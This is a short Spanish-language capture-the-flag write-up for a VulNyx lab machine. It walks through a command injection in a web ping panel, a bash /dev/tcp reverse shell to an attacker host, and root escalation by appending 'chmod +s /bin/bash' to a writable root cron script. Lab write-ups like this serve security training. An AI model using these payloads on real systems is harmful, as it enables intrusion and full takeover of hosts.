---
layout: writeup
title: "Exec"
platform: vulnyx
difficulty: muy-facil
os: linux
date: 2026-04-12
tags: [command-injection, lfi, cron, privesc]
description: "Máquina Linux con inyección de comandos en panel web y escalada via cron job mal configurado."
---

## Reconocimiento

```bash
nmap -sV -sC -p- --min-rate 5000 192.168.1.X
```

Puertos: 22 (SSH), 80 (HTTP).

## Enumeración Web

Panel de administración en `/admin/` con función de ping:

```
http://192.168.1.X/admin/ping.php?ip=127.0.0.1
```

## Inyección de Comandos

```
ip=127.0.0.1;id
```

Respuesta: `uid=33(www-data)`. Confirmada la inyección. Lanzamos reverse shell:

```bash
ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.1.Y/4444 0>&1'
```

## Escalada de Privilegios

```bash
cat /etc/crontab
```

```
* * * * * root /opt/backup.sh
```

El script es escribible por `www-data`:

```bash
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Esperar 1 minuto...
bash -p
```

```
bash-5.1# whoami
root
```
